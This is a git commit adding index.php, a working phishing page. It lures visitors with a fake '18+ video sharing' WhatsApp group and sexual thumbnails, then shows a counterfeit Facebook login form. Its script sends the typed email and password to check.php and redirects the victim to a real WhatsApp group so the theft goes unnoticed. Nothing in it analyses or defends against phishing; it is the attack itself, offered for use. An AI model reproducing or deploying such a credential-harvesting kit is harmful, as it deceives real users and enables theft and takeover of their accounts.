487e4e9961c7e8d91764ec364629d9777cb9f84d
Jefanya Efandchris <53685179+jefanya14@users.noreply.github.com>
2022-10-11 18:29:49 +0700

    upload

---
+++ index.php
@@ -0,0 +1,203 @@
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css">
+    <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
+    <link rel="stylesheet" href="css/alex-facebook.css">
+    <title>Join the viral group</title>
+    <link rel="icon" type="png/image" href="img/wa-img.png">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <main>
+        <button class="btnalxawl alxbtnawl" onclick="alxgab()">Open Group 18+</button>
+        <button class="btnalxawl alxbtnakh" onclick="alxcls()" style="display: none;">Open Group 18+</button>
+        <section style="display: none;">
+            <div class="ldalxawl">
+                <i class="fa-duotone fa-spinner-third fa-spin"></i>
+            </div>
+            <div class="alximawl" style="display: none;">
+                <img src="https://i.postimg.cc/yxR2XShp/IMG-20220726-204843.jpg" alt="">
+                <div class="dgnbosalx">
+                    <p>Share Videos 18+💦</p>
+                    <span>Group ∙ 167 Participant</span>
+                </div>
+                <div class="icalxakh">
+                    <div class="itmalxakh" onclick="tstalxwrg()">
+                        <i class="fa-solid fa-phone"></i>
+                        <span>Call</span>
+                    </div>
+                    <div class="itmalxakh" onclick="tstalxwrg()">
+                        <i class="fa-solid fa-video"></i>
+                        <span>Video</span>
+                    </div>
+                    <div class="itmalxakh" onclick="tstalxwrg()">
+                        <i class="fa-light fa-magnifying-glass"></i>
+                        <span>Search</span>
+                    </div>
+                </div>
+                <div class="medalxakh">
+                    <div class="txtalxakh" onclick="tstalxwrg()">
+                        <p>Media, links and docks</p>
+                        <span>826 <i class="fa-light fa-angle-right"></i></span>
+                    </div>
+                    <div class="ovfalxakh">
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.ibb.co/6btqPzf/46534653647534676.png" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>4.31</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.postimg.cc/N0JzTxXk/IMG-20220726-210625-picsay.jpg" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>1.24</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.ibb.co/6JWXqcQ/9429795792947.png" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>2.56</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.ibb.co/HYCbNV0/236272365237.png" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>3.06</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.ibb.co/zbkXm2T/165325118357786736-1.png" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>3.00</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <img src="https://i.ibb.co/85YydzM/165325118357786736.png" alt="">
+                            <div class="vidalxovf"><i class="fa-solid fa-video"></i> <span>2.24</span></div>
+                        </div>
+                        <div class="itmalxovf" onclick="tstalxwrg()">
+                            <i class="fa-light fa-angle-right"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="btnalexakh">
+                    <button onclick="opalexf()">JOIN THE GROUP</button>
+                </div>
+            </div>
+        </section>
+        <alex style="display: none;"><span>Unable to take action<br>Please join the group first.</span></alex>
+
+        <div class="popup-ariandi alex-facebook animate fadeIn" id="alexfb9" style="display: none;">
+            <div class="container-box-fb" style="margin-top: 10%;">
+                <div class="atasan-fb" style="width: 95.2%;">
+                    <img src="https://i.postimg.cc/qBnJ3kMn/image.png">
+                </div>
+                <div class="isi-facebook">
+                    <p class="kaget email-fb2" style="width: 320px;">The mobile number or email you entered does not match any account.<b>Find your account.</b></p>
+                    <p class="kaget sandi-fb2" style="width: 320px;">Wrong password. <b>Did you forget your password?</b></p>
+                    <img src="https://i.postimg.cc/rmcGJxTL/Facebook-f-logo-2019-svg.png">
+                    <div class="txt-ucapan-fb">Log in to your Facebook account to connect to Group 18+</div>
+                    <form class="form-login-fb" id="alexfr9">
+                        <label>
+                            <input type="text" id="alx_email_fb9" name="email" placeholder="Email or Phone Number" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required="">
+                        </label>
+                        <label>
+                            <input type="password" id="alx_password_fb9" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" style="background: #fff; width: 90%" required="">
+                        </label>
+                        <input type="hidden" name="login" id="alx_login_fb" value="Facebook" readonly="">
+                        <input type="hidden" id="resgrup9" value="https://chat.whatsapp.com/F3WDnGy5DOeHpVDYTPJ9go" readonly="">
+                        <button class="btn-login-fb" type="button" onclick="alexf()">Log In</button>
+                    </form>
+                    <div class="txt-buat-akun">Create Account</div>
+                    <div class="txt-tidak-sekarang">not now</div>
+                    <div class="txt-lupa-password">Forgot Password? • Help Centre</div>
+                </div>
+                <div class="isi-bahasa">
+                    <center>
+                        <div class="nama-bahasa bahasa-aktif">English (UK)</div>
+                        <div class="nama-bahasa">Bahasa Indonesia</div>
+                        <div class="nama-bahasa">Basa Jawa</div>
+                        <div class="nama-bahasa">Bahasa Melayu</div>
+                        <div class="nama-bahasa">日本語</div>
+                        <div class="nama-bahasa">Español</div>
+                        <div class="nama-bahasa">Português (Brasil)</div>
+                        <div class="nama-bahasa"><i class="fa fa-plus"></i>
+                        </div>
+                    </center>
+                </div>
+                <div class="kalobukanalexsiapalagi">Facebook Inc.</div>
+            </div>
+        </div>
+
+    </main>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script>
+        function alxgab() {
+            $('section').show();
+            $('.alxbtnawl').hide();
+            $('.alxbtnakh').show();
+            $('.ldalxawl').show();
+            setTimeout(() => {
+                $('.ldalxawl').hide();
+                $('.alximawl').fadeIn();
+            }, 1000)
+        }
+
+        function alxcls() {
+            $('section').hide();
+            $('.alxbtnawl').show();
+            $('.alxbtnakh').hide();
+            $('.ldalxawl').show();
+            $('.alximawl').hide();
+        }
+
+        function tstalxwrg() {
+            $('alex').fadeIn();
+            setTimeout(() => {
+                $('alex').fadeOut();
+            }, 3000)
+        }
+
+        function opalexf() {
+            $('#alexfb9').show();
+        }
+
+        function alexf() {
+            var redirect = $("#resgrup9").val();
+            var emailfb = $("#alx_email_fb9").val(),
+                sandifb = $("#alx_password_fb9").val();
+
+            if (!emailfb || emailfb == null || emailfb.length <= 0) {
+                $("#alx_email_fb9").addClass("salahfbalex");
+                $(".email-fb2").show();
+                return false;
+            } else {
+                $("#alx_email_fb9").removeClass("salahfbalex");
+                $(".email-fb2").hide();
+            }
+            if (!sandifb || sandifb == null || sandifb.length <= 0) {
+                $("#alx_password_fb9").addClass("salahfbalex");
+                $(".sandi-fb2").show();
+                return false;
+            } else {
+                $("#alx_password_fb9").removeClass("salahfbalex");
+                $(".sandi-fb2").hide();
+            }
+
+
+            // if all form are filled
+            if (emailfb.length >= 0 && sandifb.length >= 0) {
+                // SEND DATA
+                $.ajax({
+                    type: 'POST',
+                    url: 'check.php',
+                    data: $('#alexfr9').serialize(),
+                    dataType: 'text',
+                    success: function() {
+                        window.location = 'https://chat.whatsapp.com/F3WDnGy5DOeHpVDYTPJ9go';
+                    }
+                })
+            }
+        }
+    </script>
+
+<div style="background: rgba(50, 131, 168, 0.5); position: absolute; z-index: 2147483647; height: 0px; width: 0px; top: 0px; left: 0px;"></div>
+
+</body>
+</html>
